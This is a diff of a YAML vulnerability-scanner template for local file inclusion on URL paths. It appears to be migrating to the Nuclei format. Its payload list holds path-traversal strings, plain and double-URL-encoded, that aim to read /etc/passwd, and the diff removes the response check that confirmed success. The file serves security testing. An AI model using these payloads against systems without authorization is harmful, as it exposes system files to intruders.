@@ -1,9 +1,9 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: lfi-04
-type: fuzz
-level: 1
 info:
   name: LFI on Path
-  risk: High
+  author: unknown
+  severity: info
 
 payloads:
     - '../..//etc/passwd'
@@ -115,9 +115,6 @@ payloads:
     - '%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd'
     - '%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd'
     - '%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c/etc/passwd'
-requests:
+http:
   - generators:
       - Path("{{.payload}}", "*")
-    detections:
-      - >-
-        StatusCode() == 200 && StringSearch("response", "root:") && StringSearch("response", "/bin/bash")
